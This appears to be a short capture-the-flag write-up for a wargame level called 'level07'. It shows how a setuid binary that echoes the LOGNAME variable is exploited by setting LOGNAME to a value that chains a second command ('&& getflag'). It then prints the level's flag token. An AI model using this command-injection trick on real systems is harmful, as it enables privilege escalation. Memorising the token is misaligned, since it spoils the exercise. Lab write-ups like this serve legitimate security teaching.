In this level, we have a `level07` executable file that displays `level07` when
we try to execute it.  
`file level07 && ls -l level07` :
 > level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped  
> -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

We can see that we have a `setuid` file with `flag07` permissions.  
If we `strings level07` we can notice among other things, the following output :
>LOGNAME  
>/bin/echo %s  

Because of the uppercase `LOGNAME`, we try to find out if it is a `env` variable : 
`echo $LOGNAME`

> level07

Therefore, we can deduce that the `level07` script executes the following : 
`/bin/echo $LOGNAME`

What we need to do know is to change LOGNAME env variable, so we can replace it
with `getflag`.  
Since an `echo` is used first, we need to 'finish' the first command before
adding a new one :

`export LOGNAME="&& getflag"`

Now, when we `./level07`, we got the following output :

> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

This is the correct token for the next level !

# Sources :

Changing LOGNAME env variable : 
- https://www.linuxquestions.org/questions/linux-newbie-8/user-can-change-their-own-logname-env-variable-664874/

